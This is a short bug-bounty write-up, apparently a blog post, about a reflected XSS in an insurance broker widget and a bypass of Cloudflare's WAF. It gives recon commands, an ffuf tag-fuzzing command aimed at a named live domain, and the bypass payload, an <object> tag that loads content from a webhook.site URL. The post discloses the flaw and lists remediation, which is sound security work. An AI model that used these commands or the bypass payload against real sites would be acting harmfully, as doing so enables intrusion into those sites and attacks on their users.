# :globe_with_meridians: XSS with Cloudflare WAF Bypass | Zurich Insurance

---

# XSS with Cloudflare WAF Bypass | Zurich Insurance

This vulnerability was discovered while hunting on a public program.

## Get Raymond Van Wart’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

When conducting recon on a target, I always prefer using passive methods before active scanning because they generate less noise. Waymore is a great tool that uses sources like Wayback Machine and Common Crawl to find endpoints for domains.

The following sequence of commands helped find potential XSS vectors. uro declutters links, Gxss tests for reflected input, and kxss checks which special characters are unsanitized.

```
cat urls_waymore.txt | uro | Gxss | kxss
```

I came across an interesting broker widget that was rendering HTML. It failed to sanitize input passed to the AgencyId parameter.

*iframe with empty source*

Unfortunately, setting the source of an iframe would trigger the WAF. This also occurred when attempting to include <script> and <img> tags.

*Cloudflare Blocked Page*

I tried using parameter pollution to smuggle in the source but that was blocked too. To search for potential tags, it was possible to fuzz the homepage. Note, WAF protection is enabled across the entire site, so there is no need to bring attention to the XSS vector.

```
❯ ffuf -u 'https://www.blueinsurance.ie/<FUZZ>' -c -w /usr/share/seclists/Miscellaneous/Web/html-tags.txt -mc all -fc 403 -rate 5
```

Fortunately, the default settings for most WAFs are not very good and I was able to bypass it using an <object> tag.

```
<object data=https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX>.
```

## Remediation

- Sanitize input passed to the agencyId parameter.

- Remove public access to the widget if it is not intended for customer use.

---
